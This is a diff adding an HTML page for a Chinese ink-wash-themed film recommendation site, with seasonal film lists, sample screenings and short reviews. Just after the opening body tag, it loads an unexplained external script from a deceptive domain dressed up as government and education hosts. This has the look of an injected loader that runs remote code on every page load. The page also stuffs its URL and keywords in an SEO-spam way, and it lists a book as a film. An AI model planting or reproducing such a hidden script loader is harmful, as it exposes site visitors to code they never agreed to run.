@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>窝窝电影网 - 水墨禅意电影推荐站</title>
+<meta name="description" content="窝窝电影网(wowodianyingwang-top.github.io)以和纸水墨与节气意象推荐好电影，提供意象片单、静心放映、影语短评与关于我们等栏目，网址：https://wowodianyingwang-top.github.io">
+<meta name="keywords" content="窝窝电影网, wowodianyingwang-top, 水墨电影, 禅意片单, 节气观影, 电影短评">
+<meta name="author" content="窝窝电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;background:#f5f1e8;color:#1c1b19;line-height:1.8;overflow-x:hidden}
+h1,h2,h3{font-family:"Songti SC","SimSun","STSong",serif}
+a{text-decoration:none;color:#b23a2e;transition:.2s}
+a:hover{color:#1c1b19}
+.container{width:92%;max-width:1180px;margin:0 auto}
+:root{--ink:#1c1b19;--washi:#f5f1e8;--washi2:#efe9dc;--seal:#b23a2e;--line:#cfc6b4;--muted:#6b6358}
+
+.header{position:fixed;top:0;width:100%;z-index:100;background:rgba(245,241,232,.96);border-bottom:1px solid var(--line)}
+.header-in{display:flex;justify-content:space-between;align-items:center;padding:1rem 0}
+.logo{font-family:"Songti SC","SimSun",serif;font-size:1.6rem;font-weight:900;letter-spacing:2px;color:var(--ink)}
+.logo span{color:var(--seal)}
+.nav-links{display:flex;gap:1.2rem}
+.nav-links a{color:var(--ink);font-size:.88rem;font-weight:700;padding:.4rem .8rem;border:1px solid transparent}
+.nav-links a:hover{border-color:var(--seal);color:var(--seal)}
+.mob-btn{display:none;background:var(--washi);border:1px solid var(--ink);color:var(--ink);font-size:1.1rem;padding:.3rem .8rem;cursor:pointer}
+
+.hero{padding:8rem 0 5rem;border-bottom:1px solid var(--line);position:relative;background:
+radial-gradient(circle at 90% 10%,rgba(178,58,46,.05),transparent 35%),
+radial-gradient(circle at 5% 95%,rgba(28,27,25,.04),transparent 40%)}
+.hero-grid{display:grid;grid-template-columns:1.2fr .8fr;gap:3rem;align-items:center}
+.hero-side{writing-mode:vertical-rl;text-orientation:upright;font-family:"Songti SC","SimSun",serif;font-size:1rem;letter-spacing:6px;color:var(--muted);height:fit-content}
+.hero h1{font-size:clamp(2.6rem,6vw,4.6rem);font-weight:900;line-height:1.05;margin-bottom:1.2rem;letter-spacing:1px}
+.hero h1 .seal{color:var(--seal)}
+.hero-url{display:inline-block;padding:.7rem 1.1rem;border:1px solid var(--ink);background:var(--washi2);font-family:monospace;font-size:.95rem;color:var(--seal);margin-bottom:1.2rem}
+.hero-url:hover{background:var(--seal);color:var(--washi)}
+.hero-desc{font-size:1.05rem;max-width:540px;margin-bottom:1.6rem;color:#3a382f}
+.hero-cta{display:inline-block;padding:.9rem 2rem;border:1px solid var(--ink);background:var(--ink);color:var(--washi);font-weight:700;letter-spacing:2px}
+.hero-cta:hover{background:var(--seal);border-color:var(--seal)}
+.enso-wrap{display:flex;justify-content:center;align-items:center;position:relative;min-height:320px}
+.enso{width:220px;height:220px;border-radius:50%;border:14px solid var(--ink);border-right-color:transparent;transform:rotate(-35deg);position:relative}
+.enso::after{content:"觀";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(35deg);font-family:"Songti SC","SimSun",serif;font-size:3.4rem;color:var(--seal);font-weight:900}
+.seal-stamp{position:absolute;right:18%;bottom:12%;background:var(--seal);color:#fff;font-family:"Songti SC","SimSun",serif;font-weight:900;padding:.35rem .55rem;letter-spacing:2px;border-radius:4px;font-size:.8rem}
+
+.section{padding:5rem 0;border-bottom:1px solid var(--line)}
+.sec-head{margin-bottom:2.6rem;display:flex;align-items:baseline;gap:1rem;flex-wrap:wrap}
+.sec-no{font-family:"Songti SC","SimSun",serif;font-size:.85rem;font-weight:900;color:#fff;background:var(--ink);padding:.2rem .7rem;letter-spacing:3px}
+.sec-head h2{font-size:2rem;font-weight:900;letter-spacing:1px}
+.sec-head p{font-size:.95rem;color:var(--muted)}
+
+.films{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1.6rem}
+.film{border:1px solid var(--ink);background:var(--washi2);padding:0;transition:.2s;position:relative}
+.film:hover{transform:translateY(-4px);box-shadow:6px 6px 0 rgba(28,27,25,.12)}
+.film-top{height:96px;display:flex;align-items:center;justify-content:space-between;padding:0 1.2rem;border-bottom:1px solid var(--line);background:#e7dfce}
+.film-season{font-family:"Songti SC","SimSun",serif;font-size:1.3rem;font-weight:900;color:var(--ink)}
+.film-mark{width:34px;height:34px;border-radius:50%;border:2px solid var(--seal);color:var(--seal);display:flex;align-items:center;justify-content:center;font-family:"Songti SC","SimSun",serif;font-weight:900}
+.film-body{padding:1.3rem}
+.film-body h3{font-size:1.2rem;font-weight:900;margin-bottom:.4rem}
+.film-body p{font-size:.86rem;color:#3a382f;margin-bottom:.9rem}
+.film-tag{display:inline-block;font-size:.74rem;font-weight:700;color:var(--seal);border:1px solid var(--seal);padding:.15rem .7rem}
+
+.screen-max{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1.4rem}
+.screen-card{border:1px solid var(--ink);background:var(--washi2);padding:1.4rem}
+.screen-card .time{font-family:monospace;font-size:.9rem;color:var(--seal);font-weight:700}
+.screen-card h3{font-size:1.1rem;font-weight:900;margin:.4rem 0 .3rem}
+.screen-card p{font-size:.84rem;color:var(--muted)}
+.screen-card .fmt{display:inline-block;margin-top:.7rem;font-size:.72rem;font-weight:700;border:1px solid var(--ink);padding:.15rem .6rem}
+
+.notes{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.6rem}
+.note{border-left:4px solid var(--seal);background:var(--washi2);padding:1.4rem 1.5rem;position:relative}
+.note .q{font-family:"Songti SC","SimSun",serif;font-size:1.15rem;font-weight:700;line-height:1.6;margin-bottom:.8rem}
+.note .by{font-size:.8rem;color:var(--muted);letter-spacing:1px}
+.note:nth-child(even){border-left-color:var(--ink)}
+
+.about{max-width:840px;margin:0 auto;border:1px solid var(--ink);background:var(--washi2);padding:2.8rem;position:relative}
+.about::before{content:"窩窩";position:absolute;top:-14px;left:24px;background:var(--seal);color:#fff;font-family:"Songti SC","SimSun",serif;font-weight:900;letter-spacing:3px;padding:.2rem .7rem;font-size:.8rem}
+.about h3{font-size:1.7rem;font-weight:900;margin-bottom:1rem;font-family:"Songti SC","SimSun",serif}
+.about p{font-size:1rem;color:#3a382f;margin-bottom:1rem}
+.about-url{display:inline-block;margin-top:.6rem;padding:.9rem 1.6rem;border:1px dashed var(--ink);font-family:monospace;color:var(--seal);font-weight:700}
+.about-url:hover{background:var(--seal);color:var(--washi);border-style:solid}
+
+.footer{background:#1c1b19;color:#e9e3d8;padding:3rem 0 1.5rem}
+.footer-brand{font-family:"Songti SC","SimSun",serif;font-size:1.7rem;font-weight:900;margin-bottom:1rem}
+.footer-brand span{color:#e8a59b}
+.footer p{font-size:.86rem;color:#b7afa1;margin-bottom:.4rem}
+.footer-nav{display:flex;gap:1.2rem;flex-wrap:wrap;margin:1.4rem 0}
+.footer-nav a{color:#e9e3d8;border:1px solid #4a463f;padding:.4rem .9rem;font-size:.82rem}
+.footer-nav a:hover{background:var(--seal);border-color:var(--seal);color:#fff}
+.footer-copy{font-size:.74rem;color:#7d766b;margin-top:1.6rem;padding-top:1.4rem;border-top:1px solid #34312b}
+
+@media(max-width:768px){
+.nav-links{display:none;position:absolute;top:100%;left:0;width:100%;flex-direction:column;background:var(--washi);border-bottom:1px solid var(--line);padding:1rem 0}
+.nav-links.open{display:flex}
+.nav-links a{border-bottom:1px solid var(--line);text-align:center;padding:1rem}
+.mob-btn{display:block}
+.hero-grid{grid-template-columns:1fr}
+.hero{padding:7rem 0 3rem}
+.hero-side{writing-mode:horizontal-tb;letter-spacing:2px;margin-bottom:.8rem}
+.enso-wrap{min-height:260px}
+.sec-head h2{font-size:1.6rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="header">
+  <div class="container header-in">
+    <div class="logo">窝窝<span>电影网</span></div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#films">意象片单</a>
+      <a href="#screen">静心放映</a>
+      <a href="#notes">影语短评</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <button class="mob-btn" onclick="document.getElementById('navLinks').classList.toggle('open')">☰</button>
+  </div>
+</header>
+
+<section id="home" class="hero">
+  <div class="container hero-grid">
+    <div>
+      <div class="hero-side">观影如坐禅　慢看即修行</div>
+      <h1>窝窝<span class="seal">电影网</span><br>水墨节气片单</h1>
+      <div class="hero-url">https://wowodianyingwang-top.github.io</div>
+      <p class="hero-desc">窝窝电影网（wowodianyingwang-top.github.io）用和纸、圆相与二十四节气整理电影。不追热门榜单的喧哗，只按心境与时节推荐可慢慢看的片子，做合法影讯、片单与短评。</p>
+      <a href="#films" class="hero-cta">入片单一观 →</a>
+    </div>
+    <div class="enso-wrap">
+      <div class="enso"></div>
+      <div class="seal-stamp">窝窝印</div>
+    </div>
+  </div>
+</section>
+
+<section id="films" class="section">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-no">壹</span>
+      <div>
+        <h2>意象片单·按节气心境</h2>
+        <p>六部可慢看的电影，配季节与情绪标签</p>
+      </div>
+    </div>
+    <div class="films">
+      <div class="film">
+        <div class="film-top"><div class="film-season">立春·萌</div><div class="film-mark">春</div></div>
+        <div class="film-body">
+          <h3>小森林（春夏季）</h3>
+          <p>田间耕种、饭食四季，适合立春后慢慢看，回到生活的本来节奏。</p>
+          <span class="film-tag">治愈/田园</span>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-top"><div class="film-season">清明·思</div><div class="film-mark">雨</div></div>
+        <div class="film-body">
+          <h3>海街日记</h3>
+          <p>四姐妹、老屋、海边四季，哀而不伤，适合清明前后沉淀心绪。</p>
+          <span class="film-tag">家庭/剧情</span>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-top"><div class="film-season">夏至·静</div><div class="film-mark">夏</div></div>
+        <div class="film-body">
+          <h3>步履不停</h3>
+          <p>是枝裕和的家庭一日，琐碎对话里藏全年最静的暑气与遗憾。</p>
+          <span class="film-tag">家庭/慢剧情</span>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-top"><div class="film-season">秋分·远</div><div class="film-mark">叶</div></div>
+        <div class="film-body">
+          <h3>无人知晓</h3>
+          <p>都市边缘的孩童日常，留白极多，适合秋日独处时沉下来看。</p>
+          <span class="film-tag">社会/写实</span>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-top"><div class="film-season">立冬·孤</div><div class="film-mark">雪</div></div>
+        <div class="film-body">
+          <h3>柏林苍穹下</h3>
+          <p>天使俯视人间，黑白与暖色交替，冬日独看很合适，关于倾听与陪伴。</p>
+          <span class="film-tag">文艺/哲思</span>
+        </div>
+      </div>
+      <div class="film">
+        <div class="film-top"><div class="film-season">大寒·禅</div><div class="film-mark">空</div></div>
+        <div class="film-body">
+          <h3>禅与摩托维修艺术</h3>
+          <p>公路、修理、专注与放下，严寒夜里看“把一件事做好”的安静力量。</p>
+          <span class="film-tag">公路/哲学</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="screen" class="section">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-no">贰</span>
+      <div>
+        <h2>静心放映·示例时刻</h2>
+        <p>小班放映室排期，实际以场地公告为准</p>
+      </div>
+    </div>
+    <div class="screen-max">
+      <div class="screen-card">
+        <div class="time">10:00－11:40</div>
+        <h3>小森林（冬春季）</h3>
+        <p>慢食与劳作剪辑版，适合上午静看，不分手机、不催进度。</p>
+        <span class="fmt">修复/日语</span>
+      </div>
+      <div class="screen-card">
+        <div class="time">14:00－15:50</div>
+        <h3>步履不停</h3>
+        <p>家庭日专场，映后留二十分钟自由写观影便签。</p>
+        <span class="fmt">中字/剧情</span>
+      </div>
+      <div class="screen-card">
+        <div class="time">16:30－18:10</div>
+        <h3>海街日记</h3>
+        <p>四季专场，配和纸手账模板，记录一句最静的台词。</p>
+        <span class="fmt">家庭/四季</span>
+      </div>
+      <div class="screen-card">
+        <div class="time">19:30－21:20</div>
+        <h3>柏林苍穹下</h3>
+        <p>夜间文艺场，弱灯、低声、圆相投影开场，偏沉浸式。</p>
+        <span class="fmt">德语/文艺</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="notes" class="section">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-no">叁</span>
+      <div>
+        <h2>影语短评</h2>
+        <p>少写剧透，多写可停留的心境</p>
+      </div>
+    </div>
+    <div class="notes">
+      <div class="note">
+        <div class="q">好电影不必一次看懂。像研墨，先淡后浓，隔日再看才有层次。</div>
+        <div class="by">—— 窝窝电影网·片单札记</div>
+      </div>
+      <div class="note">
+        <div class="q">节气换片比榜单换片更耐看。立春存希望，大寒存空白，四季各自有它的镜头。</div>
+        <div class="by">—— 窝窝电影网·节气札记</div>
+      </div>
+      <div class="note">
+        <div class="q">家庭片最怕说教。真正好的，是把饭香、雨声、未说的话都留在画面里。</div>
+        <div class="by">—— 窝窝电影网·短评</div>
+      </div>
+      <div class="note">
+        <div class="q">夜间文艺场不追求烧脑。灯暗下来，圆相一画，心先静，片才好进。</div>
+        <div class="by">—— 窝窝电影网·放映札记</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about" class="section">
+  <div class="container">
+    <div class="about">
+      <h3>关于窝窝电影网</h3>
+      <p>窝窝电影网（网址：https://wowodianyingwang-top.github.io）是一个以水墨、和纸与节气为视觉的电影推荐单页。内容只做合法影讯、意象片单、放映示例与短评，不提供盗版资源下载，也不引导网盘/私链。</p>
+      <p>我们按“春萌、清思、夏静、秋远、冬孤、寒禅”组织片子，让你在通勤、睡前、周末都能挑到一部不吵不累的电影。站内所有栏目均为单页锚点，方便手机慢读。</p>
+      <p>窝窝电影网——慢一点，才看得清。</p>
+      <a href="#" class="about-url">https://wowodianyingwang-top.github.io</a>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="container">
+    <div class="footer-brand">窝窝<span>电影网</span></div>
+    <p>网址：https://wowodianyingwang-top.github.io</p>
+    <p>关键词：窝窝电影网 / wowodianyingwang-top / 水墨片单 / 节气观影</p>
+    <div class="footer-nav">
+      <a href="#home">首页</a>
+      <a href="#films">意象片单</a>
+      <a href="#screen">静心放映</a>
+      <a href="#notes">影语短评</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="footer-copy">© 2026 窝窝电影网(wowodianyingwang-top) · 示例展示页 · 内链使用 # 占位 · 不生成 robots.txt 与 sitemap.xml</div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('navLinks').classList.remove('open');});
+});
+</script>
+</body>
+</html>
